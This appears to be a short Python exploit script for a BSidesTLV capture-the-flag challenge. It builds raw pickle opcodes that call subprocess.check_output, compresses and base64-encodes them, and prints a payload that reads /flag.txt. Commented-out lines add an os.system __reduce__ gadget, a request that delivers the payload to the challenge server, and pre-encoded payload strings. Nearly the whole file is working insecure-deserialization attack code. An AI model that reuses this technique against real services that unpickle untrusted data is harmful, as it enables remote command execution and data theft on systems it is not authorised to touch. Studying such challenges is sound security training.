# # import pickle

# # k = b'eNrTSCkw5ApWL8sszizJLypW5yow4tLIKTDmCsvNLyqp5Cow4UosDlZPzS3Iya9MTQUpMAUpMANqCipNSs0DCphzJQarO%2BblZaYCORYgTkB%2BXnJGPpBnCeIF5aenFgE5hgZghTk5YF2GhkCT9QDJ4iXE'
# # print(pickle.loads(k))

# import pickle
import zlib
import requests
import base64
import os
import gzip
# import pickle
# class RCE:
#     def __reduce__(self):
#         cmd = ('ls -la')
#         return os.system, (cmd,)
# pickled = pickle.dumps(RCE())

def create_command(cmd, args, flags):
  template = """csubprocess
check_output
(((S'{0}'
S'{1}'
S'{2}'
ltR."""
  return base64.b64encode(zlib.compress(template.format(cmd, args, flags).encode('utf-8'), 9))
# 
  
print(create_command('cat','/flag.txt','-u'))

# targeturl = 'http://challenges.bsidestlv.com:8088/statusMembers.html?data={0}&format=json' 
# r = requests.get(targeturl.format(create_command( 'ls' , '../' , '-l'))) 
# print ( r . text ) 
 
 
 
# eNrTSCkw5ApWL8sszizJLypW5yow4tLIKTDmCsvNLyqp5Cow4UosDlZPzS3Iya9MTQUpMAUpMANqCipNSs0DCphzJQarO%2BblZaYCORYgTkB%2BXnJGPpBnCeIF5aenFgE5hgZghTk5YF2GhkCT9QDJ4iXE
# eNprYJmaxwABPawF+cWZFVN62Iori0tSc6dMntITXJSroF+SW6CfZq2Qm52WmZYP5yYnlkDZCjUK+kmZefrFGQq6mQpGdmqGQJG8ZAVDI3M9AyA0BLKMTRTsoMqntE4JmqIHAAnfJQQ=